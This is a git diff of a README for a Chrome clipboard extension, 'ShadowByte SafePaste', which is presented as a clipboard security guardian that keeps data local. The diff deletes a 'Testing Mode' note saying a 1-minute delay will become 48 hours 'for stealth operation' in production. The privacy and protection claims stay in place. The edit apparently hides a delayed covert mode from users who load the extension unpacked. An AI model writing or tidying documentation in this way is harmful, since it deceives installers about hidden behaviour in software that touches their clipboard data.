@@ -73,7 +73,6 @@ ShadowByte SafePaste is your personal clipboard security guardian. This extensio
 ```bash
 # Clone the repository
 git clone https://github.com/InoshMatheesha/Clipboard-Extension-TJ.git
-
 # Navigate to chrome://extensions/
 # Toggle "Developer mode" ON
 # Click "Load unpacked" and select the folder
@@ -95,11 +94,6 @@ git clone https://github.com/InoshMatheesha/Clipboard-Extension-TJ.git
 4. **Protect** — Prevents accidental data leaks
 
 **Your data stays private.** All processing happens locally on your device.
-
-## Testing Mode
-
-⚠️ **Currently set to 1 minute delay for testing purposes.**  
-In production, this will be changed to 48 hours for stealth operation.
 
 ---
 
